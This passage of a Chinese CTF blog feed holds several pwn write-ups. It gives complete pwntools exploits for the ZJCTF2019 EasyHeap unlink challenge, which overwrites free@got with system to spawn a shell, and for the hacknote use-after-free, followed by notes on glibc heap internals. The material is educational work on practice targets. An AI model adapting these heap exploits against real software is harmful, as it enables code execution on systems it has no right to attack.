src="/img/%5BZJCTF2019%5DEasyHeap/2.jpg"></p><p>查看heaparray地址上的值：</p><p><img src="/img/%5BZJCTF2019%5DEasyHeap/3.jpg"></p><p>说明fakechunk成功完成unlink操作，heaparray[0]指向了0x6020c8</p></li><li><p>这时edit(0)会从0x6020c8这个地址开始写，因此</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> +p64(free_got)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span> ,payload)<br></code></pre></td></tr></table></figure><p>又一次覆盖了heaparray[0]，指向了<code>free@got</code></p></li><li><p>这时edit(0)会修改<code>free@got</code>的内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">edit(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>,p64(system_plt))<br></code></pre></td></tr></table></figure><p>将其函数改为system函数的plt表</p></li><li><p>delete(2)会调用free(“/bin/sh”)，而free函数被替换成了system，因此得到了shell</p></li></ol><h4 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27679</span>)<br>elf = ELF(<span class="hljs-string">&quot;./easyheap&quot;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>    r.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;Size of Heap : &quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(size))<br>    r.recvuntil(<span class="hljs-string">&quot;Content of heap:&quot;</span>)<br>    r.sendline(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, size, content</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>    r.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(idx))<br>    r.recvuntil(<span class="hljs-string">&quot;Size of Heap : &quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(size))<br>    r.recvuntil(<span class="hljs-string">&quot;Content of heap : &quot;</span>)<br>    r.sendline(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>    r.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>heaparray_addr = <span class="hljs-number">0x6020E0</span><br>system_plt = elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free_got = elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br><br>add(<span class="hljs-number">0x90</span>,<span class="hljs-string">b&quot;MMMM&quot;</span>)<br>add(<span class="hljs-number">0x90</span>,<span class="hljs-string">b&quot;MMMM&quot;</span>)<br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>)<br><span class="hljs-comment">#gdb.attach(r)</span><br><br>fake_chunk = p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x91</span>) + p64(heaparray_addr-<span class="hljs-number">0x18</span>) + p64(heaparray_addr-<span class="hljs-number">0x10</span>)<br>fake_chunk = fake_chunk.ljust(<span class="hljs-number">0x90</span>,<span class="hljs-string">b&#x27;M&#x27;</span>)<br>fake_chunk += p64(<span class="hljs-number">0x90</span>) + p64(<span class="hljs-number">0xa0</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x100</span>,fake_chunk)<br>delete(<span class="hljs-number">1</span>)<br><span class="hljs-comment">#gdb.attach(r)</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> +p64(free_got)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span> ,payload)<br><span class="hljs-comment">#gdb.attach(r)</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>,p64(system_plt))<br>delete(<span class="hljs-number">2</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>UAF</title>
    <link href="/2022/11/22/ctf-pwn/UAF/"/>
    <url>/2022/11/22/ctf-pwn/UAF/</url>
    
    <content type="html"><![CDATA[<h4 id="参考ctf-wiki"><a href="#参考ctf-wiki" class="headerlink" title="参考ctf-wiki"></a>参考ctf-wiki</h4><p><a href="https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/heap/use_after_free/hitcon-training-hacknote">https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/heap/use_after_free/hitcon-training-hacknote</a></p><p>以下实验所用程序（与源码）见上述链接中文件hacknote（与hacknote.c）</p><h4 id="漏洞的发现"><a href="#漏洞的发现" class="headerlink" title="漏洞的发现"></a>漏洞的发现</h4><p>在<code>del_note()</code>函数中free掉指针之后没有清零：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">void</span> <span class="hljs-title function_">del_note</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">4</span>];<br>  <span class="hljs-type">int</span> idx;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index :&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4</span>);<br>  idx = atoi(buf);<br>  <span class="hljs-keyword">if</span> (idx &lt; <span class="hljs-number">0</span> || idx &gt;= count) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Out of bound!&quot;</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> (notelist[idx]) &#123;<br>    <span class="hljs-built_in">free</span>(notelist[idx]-&gt;content);<br>    <span class="hljs-built_in">free</span>(notelist[idx]);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Success&quot;</span>);<br>  &#125;<br>&#125;<br><span class="hljs-comment">// 并且在add_note中是根据notelist[i]是否为nullptr判断在哪个位置add新note</span><br></code></pre></td></tr></table></figure><p>程序中给了system：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> <span class="hljs-title function_">magic</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-keyword">return</span> system(<span class="hljs-string">&quot;cat flag&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="漏洞利用方法"><a href="#漏洞利用方法" class="headerlink" title="漏洞利用方法"></a>漏洞利用方法</h4><p>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;aaaa\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;bbbb\n&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x8</span>, p32(magic))<br>show(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>下面介绍这个exp的原理</p><p>在delete 0和1之后fastbin结构如下图</p><div class="mxgraph" style="max-width:100%;border:1px solid transparent;" data-mxgraph="{&quot;highlight&quot;:&quot;#0000ff&quot;,&quot;nav&quot;:true,&quot;resize&quot;:true,&quot;xml&quot;:&quot;&lt;mxfile host=\&quot;app.diagrams.net\&quot; modified=\&quot;2022-11-22T16:47:04.851Z\&quot; agent=\&quot;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36\&quot; etag=\&quot;xMjKslWb0NtHo6yfLEq6\&quot; version=\&quot;20.5.3\&quot; type=\&quot;device\&quot;&gt;&lt;diagram id=\&quot;wU8d93oxY3eO_jrvUp61\&quot; name=\&quot;第 1 页\&quot;&gt;7VlZj9sgEP4tfbDUPqRyfOR43CTbXamt1GrVdts3YmMbBYOLydVfXzDgM8c2qyZZaV9imBkG+Ga+ATuWO003dwxkyWcaQmw5drix3JnlOP3h2BYPKdkqycjVgpihUBtVggf0B2qhMVuiEOYNQ04p5ihrCgNKCAx4QwYYo+umWURxc9YMxLAjeAgA7kp/oJAnehfOsJLfQxQnZub+YKw0KTDGeid5AkK6roncW8udMkq5aqWbKcQSPIOLGvdhj7ZcGIOEP2XA6uun4bfsz+BxDqPo4+Ps1/dl2hsoLyuAl3rD1tSxJkP96wxAmlnuhMxz+bDkFNcoqq/56b+XX/du0Wm7ORGDIjX51uQ7o0sSQpkytljNOkEcPmQgkNq1YLiQJTzFotcXzYgSrinrjIrFt1NSZ+kKMg43NZFO0TtIU8jZVpgYraGLrheur/vrin2+qSFJjXkDLQOa8HHpuuKEaGha/ANFhl2KOAMsZp3kGSAN9Aa/l5LNk4Biyiz3RihZPH8rViamts3jnQqzBK8XgRThrTK9h3gFOQpATZ8X6EqtM8o2dYWaVGoIZSnANd0KMATEE6MY8CWT5fOgXQCyfSZrjbBUeratNBhyDllPbD9AJO6OpCxLANEuHSUT4ec9IFZElDgQKQJZTYdE2hE9k222Wmg4E84i4d/MRKDSipQo6nttmjVlYXNhpS+xl/kCCXfSZ84ZXcCeTqqG3RwEi7igQa8VR8cbqRA63lg3fBPNwmsIA8oAR5T0eIKCBYG5Xh4iiCODT9u2FsuDdrXlNOwiTAFvgxOiPMNga8wxEgrHfoPSjDIOJNKTKmFFK5bPCORcQoBE9HSSC86oPFcWnYIhF3neSnGgMvS9c1aG0Y7KcG3l1D9eTsuSexbQxtcPmju4NtDMbfgQapCEN/LCK3oBBnmOgiZQTVTbsMEN4o9S997XvZ96nGzPNnpY0dnqzl6oc7pkATzOHBg2Lt/dgNQP/R14GxmDWFTIVfPKvisIeoYvFBFexdv3mvH2/FYc1X70qPoVu+WofGsxjoYtRxywGPKOoyInym0/I02cTpoEyZIshGhq6vmcmVJub0bdcn5p7rULVgnh5bjnvSjuXQmn2lQo7+zP5ZQ/PjOn/L2cunmhnCohvByndnx3eOXUMU55rXdjr38ipzqOzn1Odd+pDadmuzjl2NdHqvYl8QoOqie8j7yS6hgXTj6oOo7OfVB136wMqSYvlVT/86QS3erjuwpC9ReGe/sX&lt;/diagram&gt;&lt;/mxfile&gt;&quot;,&quot;toolbar&quot;:&quot;pages zoom layers lightbox&quot;,&quot;page&quot;:0}"></div><script type="text/javascript" src="https://app.diagrams.net/js/viewer-static.min.js"></script><p>chunk A是申请的<code>note[0]</code>结构体的空间，chunk B是<code>note[0]-&gt;content</code>的空间</p><p>chunk C、D是<code>note[1]</code>的空间</p><p>由于fastbin会把同样大小的块放在同一个链表上，因此两个0x8大小的chunk A、 chunk C会被连在一起，并且由于fastbin使用的是先进后出的单向链表，A在C下面。</p><p>当申请一个content大小为0x8的新的note时，会将A和C从fastbin中取出。先malloc结构体本身，使用chunk C，然后malloc content，使用chunk A。</p><p>因此<code>add(0x8,p32(magic))</code>会把magic地址写入content，调用show的时候，会直接执行这个函数。</p><p>理论是如此，下面用gdb验证一下</p><h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><p>完整exp，在两次add、两次delete、最后一次add之后分别attach查看notelist</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r = process(file_name)<br>elf = ELF(<span class="hljs-string">&#x27;./hacknote&#x27;</span>)<br>menu = <span class="hljs-string">&#x27;Your choice :&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, content</span>):<br>    r.sendlineafter(menu, <span class="hljs-string">&#x27;1&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">&#x27;Note size :&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>    r.sendafter(<span class="hljs-string">&#x27;Content :&#x27;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    r.sendlineafter(menu, <span class="hljs-string">&#x27;2&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">&#x27;Index :&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    r.sendlineafter(menu, <span class="hljs-string">&#x27;3&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">&#x27;Index :&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>():<br>    gdb.attach(r)<br><br>add(<span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;aaaa\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;bbbb\n&#x27;</span>)<br>dbg()<br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">1</span>)<br>dbg()<br>magic = <span class="hljs-number">0x08048986</span><br>add(<span class="hljs-number">0x8</span>, p32(magic))<br>dbg()<br>show(<span class="hljs-number">0</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><p>在ida中可以看到notelist的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.bss:0804A070 ; void *notelist<br>.bss:0804A070 notelist        dd ?                    ; DATA XREF: add_note+40↑r<br>.bss:0804A070                                         ; add_note+61↑w ...<br>.bss:0804A074                 db    ? ;<br></code></pre></td></tr></table></figure><p>查看三次notelist的内容，</p><p><img src="/img/UAF/1.jpg"></p><p><img src="/img/UAF/2.jpg"></p><p><img src="/img/UAF/3.jpg"></p><p>可以看到，<code>0x92f31a0</code>上的地址为print_note函数的地址，在free之前，<code>0x92f31a4</code>上的内容指向下一行开头，即<code>aaaa</code>字符串，所以这里就是note[0]。</p><p>在第三次add之后改变了note[0]原本在print_note上的函数指针，因此show(0)时会执行magic</p>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>exp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Heap 基础知识</title>
    <link href="/2022/11/18/ctf-pwn/heap%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <url>/2022/11/18/ctf-pwn/heap%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">void</span> *<span class="hljs-title">malloc</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span></span>;<br></code></pre></td></tr></table></figure><p>size = 0时，返回系统允许的最小内存块</p><p>32位系统下malloc(0)分配8Bytes，64位分配16Bytes</p><h3 id="brk"><a href="#brk" class="headerlink" title="brk"></a>brk</h3><p>堆段的起点和终点标识符：start_brk、brk（program brk)</p><p>不开ASLR，初始时都指向bss段末尾（end_data)</p><p>开启ASLR，会随机向后偏移一段距离</p><p><code>brk()</code>函数作用为抬高brk指针，获取一段heap</p><p>程序开始时heap大小为0，第一次申请堆的时候，通过brk()向系统申请一段内存  <strong>main_arena</strong>，后面malloc都会从main_arena中申请内存</p><h3 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc</span> <span class="hljs-title">chunk</span>&#123;</span><br>    INTERNAL_SIZE_T mchunk_prev_size; <span class="hljs-comment">/* Size of previous chunk (if free).*/</span><br>    INTERNAL_SIZE_T mchunk_size;      <span class="hljs-comment">/* Size in bytes，including overhead.*/</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc</span> <span class="hljs-title">chunk</span>* <span class="hljs-title">fd</span>;</span>          <span class="hljs-comment">/* double links -- used only if free.*/</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc</span> <span class="hljs-title">chunk</span>* <span class="hljs-title">bk</span>;</span>          <span class="hljs-comment">/* Only used for large blocks: pointer to next larger size. */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd_nextsize</span>;</span> <span class="hljs-comment">/* double links -- used only if free.*/</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc</span> <span class="hljs-title">chunk</span>* <span class="hljs-title">bk_nextsize</span>;</span><br>&#125;<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">mchunkptr</span>;</span><br></code></pre></td></tr></table></figure><h4 id="allocated-chunk"><a href="#allocated-chunk" class="headerlink" title="allocated chunk"></a>allocated chunk</h4><p><strong><code>prevsize </code>：</strong>如果前一个chunk是free的<em><strong>（这里指的是内存中的前一个，而不是freelist中的前一个）</strong></em>，它代表前一个chunk的大小；如果不是free的，存储前一个的user data 。32位中是4字节，64位中是8字节</p><p><strong><code>size</code>：</strong>此chunk大小。最低3位用来存储N（chunk 在 non_main_arena里为1）、M（chunk是mmap得到的为1）、P（前一个chunk已被分配为1 对应prevsize），因此size是8字节对齐的</p><p>没有 <strong>fd bk fd_nextsieze bk_nextsize</strong></p><p><strong><code>userdata</code>：</strong>数据</p><p>（下一个chunk的prevsize也会存储userdata）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> request2size(req) ...   <span class="hljs-comment">//可以计算申请字节需要实际分配多少字节</span></span><br></code></pre></td></tr></table></figure><p>chunk是在prevsize开始，但是malloc返回的指针指向userdata</p><h4 id="free-chunk"><a href="#free-chunk" class="headerlink" title="free chunk"></a>free chunk</h4><p><code>prevsize</code>：上一个chunk的userdata，因为上一个如果也是free，则会被合并（fast bin中可能会例外，后面会提及）</p><p><code>size</code>：同上</p><p><code>fd bk</code>：（在freelist中的）前一个/后一个chunk</p><h4 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h4><p>位于arena顶部。在所有bin都没有满足需求的chunk时，从top chunk切割</p><p>top chunk 不够，在main_arena中会用brk扩张top chunk，non_main_arena中，用mmap分配新的堆</p><h3 id="Bin"><a href="#Bin" class="headerlink" title="Bin"></a>Bin</h3><p>除了fastbin被存储在一个长度为10的fastbinY的数组里，其余的small large unsorted bin都存储在一个bins数组里</p><p>NBINS是126，包括1个unsorted bin，62个small bin，63个large bin。</p><div class="mxgraph" style="max-width:100%;border:1px solid transparent;" data-mxgraph="{&quot;highlight&quot;:&quot;#0000ff&quot;,&quot;nav&quot;:true,&quot;resize&quot;:true,&quot;toolbar&quot;:&quot;zoom layers tags lightbox&quot;,&quot;edit&quot;:&quot;_blank&quot;,&quot;xml&quot;:&quot;&lt;mxfile host=\&quot;app.diagrams.net\&quot; modified=\&quot;2022-11-17T04:09:19.532Z\&quot; agent=\&quot;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36\&quot; etag=\&quot;ojfzveORWWdzC3RN6ooc\&quot; version=\&quot;20.5.3\&quot; type=\&quot;device\&quot;&gt;&lt;diagram id=\&quot;FyZdLwTWtfESSsWo7Yml\&quot; name=\&quot;第 1 页\&quot;&gt;7ZlNc5swEIZ/jY/JgASCHOPEaQ7pNDNups0poxoF6GCJCvmrv74rIwyCEieeSUybnMyupEV6tK9YwwhfzNefJM2TzyJi2Qg50XqEL0cIuTg8gx/t2RiPEzilJ5ZpVPoajmn6m1UdjXeRRqwwvtKlhMhUmtvOmeCczZTlo1KKld3tUWSR5chpzKxpaMd0RjPW6fYtjVRSekMU1P5rlsZJdWeXmBXPadXZBC4SGolVw4UnI3whhVDl1Xx9wTJNz+Zy1dO6m5hkXD1nwPVEnE/c5bn/8JD9ouvwhn+5OzFRljRbmAV/FYrqYeOUFyNEMog9/iHhKtZXLiZmNWpTIZJiwSOm7+JAj1WSKjbN6Uy3riArwJeoeQaWC5ePgiuzyy4B29yfScXWvQtzd7gg0ZiYMyU30MUMQBVyk2MnQVjaq3rDXGJ2IWlsVmh81ORIvAtdY4QLQ/IFVHGH6hUtVD9UZ3BMXddCivzgyEi9DtI7XghYYdSPdXBUEQkGhtXvYL2hEk7EPqYEDw6qj52BQSUdqNM5zfoPVYIGBzVonanHhxp0oPaoHg3vCdVO0QAdGeZZB2aHGYugDjImFxx+xnDcJiIWnGY3QuQG10+m1MbwogslbJg2+SZawDVmPDrXNRrYImccPIWictfFK7s0zUIs5IzdMpkCCCb1LqY8htYQGpU+ulRP42whl9uJ6Gmxdaq+60mdIt+Y942my7WZ8NbYVAYH9OUovzLvm231sK1VjSvRap5Ppw/g365uf7lWLnRfAdJNx2a+eSa3JMuoSpf23P6WcCbcrUi5qlMbO61KISR2CLNj5ahmedoK5Hl7ApndbQeCBKKbRrdcdyg6CtlROFw0VZn2flVzoAAqtbkNqUGIwH9abmDsZnU8KQUfUnoFKXX/d74zKf2jD6Dgmarx3kw17drKdfCBqsF2yYvdVqDjqwZ9qEY18v9/E43/ZqJBDrJyvXov8VLNuO33REEr0PE1030X9141ExwkGo80VXPinML5uqfc09YrVm7PlRN5MzkR1HoGVW90Xqongj1bT21hvqKewKw/RpTd6286ePIH&lt;/diagram&gt;&lt;/mxfile&gt;&quot;}"></div><script type="text/javascript" src="https://viewer.diagrams.net/js/viewer-static.min.js"></script>#### fast bin<p>在free一个chunk到fast bin时，它下一个chunk的P位（PREV_INUSE)是不会变的，还是为1，为了加快free的效率。<strong>因此地址连续的两个chunk 被free到fast bin，他们不会被合并</strong>。</p><p><strong>content的大小范围：32位：8<del>80，64位：16</del>160</strong>，都是10个bin，但是实际上fastbin的大小范围并不包含最大的两个bin</p><p>新的chunk加入bin时，<strong>fd</strong>指向原来的栈顶，先进后出（LIFO）</p><h4 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h4><p>大小范围</p><p>32位，最小为16字节，公差为8，最大为504字节，所以是62个small bin</p><p>64为，最小为32字节，公差为16，最大为1008字节</p><h4 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h4><p>大小范围</p><p>32位（大于等于512字节）64位（大于等于1024字节），每个链表里的chunk不一定一样大，只要是属于某个特定区间就行</p><p>63个bin被分为6组</p><table><thead><tr><th align="center"></th><th align="center">数量</th><th align="center">公差</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">32</td><td align="center">64字节</td></tr><tr><td align="center">2</td><td align="center">16</td><td align="center">512</td></tr><tr><td align="center">3</td><td align="center">8</td><td align="center">4096</td></tr><tr><td align="center">4</td><td align="center">4</td><td align="center">32768</td></tr><tr><td align="center">5</td><td align="center">2</td><td align="center">262144</td></tr><tr><td align="center">6</td><td align="center">1</td><td align="center">不限制</td></tr></tbody></table><p>第一组起始大小是512，也就是第一组的第一个bin的范围为[512,512+64) ， 最后一个为[512 + 64*31, 512 + 64*32)</p><p>第二组接着第一组的末尾，第一个bin也就是[2560, 2560+ 512)，以此类推</p><p>每个的具体大小可在第四个参考文献里看</p><h4 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h4><p>释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中</p><p>分配时，如果在unsorted bin里没找到合适的chunk，则把unsorted bin里的chunk分配到small 和 large里，，然后再在 bin 中分配合适的 chunk</p><h3 id="内存分配流程"><a href="#内存分配流程" class="headerlink" title="内存分配流程"></a>内存分配流程</h3><p> <img src="/img/heapexploitation/1.jpg"></p><h3 id="内存释放流程"><a href="#内存释放流程" class="headerlink" title="内存释放流程"></a>内存释放流程</h3><p> <img src="/img/heapexploitation/2.jpg"></p><h3 id="tcache相关知识"><a href="#tcache相关知识" class="headerlink" title="tcache相关知识"></a>tcache相关知识</h3><p>以下全是64位机器来说</p><p>tcache同fastbin，先进后出，不动inuse</p><p>tcache出现后，每次产生堆都会先产生一个0x250大小的堆块，位于堆的开头。这0x250中（header占16字节），前0x40字节，对应64条tcache的链表，描述每个链表中的个数（每个链表最多7个chunk），然后0x200字节对应每个链表的开头地址。</p><p>tcache的64个链表从0x20开始，到0x410结束，公差16字节</p><p>tcache的链表指针指向的是chunk的content，而不是开头</p><blockquote><p>在2.27没有doublefree检查</p></blockquote><h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><p><a href="https://heap-exploitation.dhavalkapil.com/">Heap Exploitation</a></p><p><a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/">Understanding glibc malloc</a></p><p><a href="https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/">Syscalls used by malloc</a></p><p><a href="https://paper.seebug.org/papers/Archive/refs/heap/glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86ptmalloc%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90.pdf">glibc 内存管理 ptmalloc 源代码分析</a></p><p><a href="https://sensepost.com/blog/2017/painless-intro-to-the-linux-userland-heap/">Painless intro to the Linux userland heap</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ROP</title>
    <link href="/2022/11/16/ctf-pwn/ROP/"/>
    <url>/2022/11/16/ctf-pwn/ROP/</url>
    
